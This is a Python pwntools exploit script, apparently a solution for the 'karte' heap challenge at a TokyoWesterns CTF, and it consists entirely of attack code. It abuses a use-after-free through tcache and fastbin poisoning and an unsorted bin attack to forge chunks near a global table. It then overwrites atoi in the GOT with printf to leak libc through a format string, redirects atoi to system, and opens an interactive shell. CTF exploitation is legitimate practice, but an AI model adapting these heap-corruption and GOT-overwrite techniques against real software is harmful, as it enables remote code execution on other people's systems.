from pwn import *
from heaputils import *

def add(desc, size):
	p.sendlineafter("> ","1")
	p.sendlineafter("Input size > ",str(size))
	p.sendafter("Input description > ",desc)
	p.recvuntil("Added id ")
	return int(p.recvline())

def modify(ID, desc):
	p.sendlineafter("> ","4")
	p.sendlineafter("Input id > ",str(ID))
	p.sendafter("Input new description > ",desc)
	p.recvuntil("Modified id ")
	return int(p.recvline())

def delete(ID):
	p.sendlineafter("> ","3")
	p.sendlineafter("Input id > ",str(ID))

def changeName(new):
	p.sendlineafter("> ","99")
	p.sendafter("Input patient name... ",new)

def addFail(size):
	p.sendlineafter(">","1")
	p.sendlineafter("Input size > ",str(size))
	p.recvuntil("alloction failed...")

def fsb(fmt):
	delete(id1)
	changeName(fmt)
	p.sendlineafter("> ","1")
	p.sendlineafter("Input size > ",str(0x6021A0))
	p.recvuntil("Input description > ")
	p.recvuntil("Added id ")

if __name__ == "__main__":
	strchr_got = 0x602040 
	fakeFastbinAddress = 0x6021A0
	printf_plt = 0x400760
	atoi_plt = 0x4007C0
	getnline = 0x400DD1 
	malloc_plt = 0x4007A0 
	init = 0x04008B7

	libc = ELF("./libc-2.27.so")
	p = remote("karte.chal.ctf.westerns.tokyo", 10001)
	p.recvuntil("Input patient name... ")
	p.send(p64(0)+p64(0x71)+p64(fakeFastbinAddress+0x50))
	
	# fill up tcache for 0x60 and 0x80
	for i in range(7):
		id1 = add("A",0x60)
		delete(id1)

	for i in range(7):
		id1 = add("A",0x80)
		delete(id1)

	id1 = add("A",0x60)
	id2 = add("B",0x60)

	delete(id1)
	delete(id2)

	# use id2 use after free
	
	modify(id2, p32(fakeFastbinAddress)) # non PIE heap is 32bit
	id1 = add("A",0x60)
	id2 = add("x"*0x40+p64(0)+p64(0x71)+p64(fakeFastbinAddress),0x60) # --> get name allocated
	
	
	id3 = add("x"*0x30+p64(0)+p64(0x21)+p64(0x21)*2+p64(0)+chr(0x21),0x60) # --> get name + 0x50 allocated
	
	# first, free name so that it goes into unsorted bin
	changeName(p64(0)+p64(0x91))
	delete(id2)

	# unsorted bin attack to get a good position near karte
	target = 0x602118-5
	log.info("target @ 0x%x"%target)

	changeName(p64(0)+p64(0x91)+p64(0x0)+p64(target-0x10))
	delete(id1)
	id1 =add("x"*0x30,0x80) # get name allocated
	# get id1 out of here!
	changeName(p64(0)+p64(0x21))	
	delete(id1)

	id1 = add("x"*0x60,0x61)
	changeName(p64(0)+p64(0x71)+p64(0x602110))
	id2 = add("x"*0x48+p64(0x21)+p64(0)+p64(0x21),0x61) # get name allocated
	changeName(p64(0)+p64(0x21))
	delete(id2)
	zfd,rfd = 2**32-1,2**32-1

	pay = "/bin/sh\x00"
	pay = pay.ljust(0x20,"\x00")
	pay += p32(0)+p32(0x1)+p64(0x602078)# an entry with ID 0x1 and ptr of atoi@got
	pay += p64(0)+p64(0x0) # id2
	pay += p32(0)+p32(0x2)+p64(0x602018)# an entry with ID 0x2 and ptr of free@got
	pay += p64(0xDEADC0BEBEEF) #lock
	id2 = add(pay,0x60) # allcoate 0x602120

	# change atoi@got to printf: now we have to use options in a different way: using number of characters as options (look for return value of printf)
	modify(0x1,p64(printf_plt)[:6])
	# first, leak libc
	# $6 is start
	p.sendlineafter("> ","%7$s".ljust(0x8,"\x00")+p64(0x602070)) #leak libc open
	data = p.recvuntil("Wrong input.").strip("Wrong input.")
	LIBC = u64(data.ljust(8,"\x00")) - libc.symbols['open']
	log.info("LIBC: 0x%x"%LIBC)

	# second, overwrite atoi with system
	system = LIBC + libc.symbols['system']
	p.sendafter("> ","aaaa\x00")
	p.sendafter("Input id > ","bb\x00")
	p.sendafter("Input new description > ",p64(system)[:6])

	p.sendafter("> ","aaa\x00")
	p.sendafter("Input id > ","%{}c".format(id2))

	p.interactive()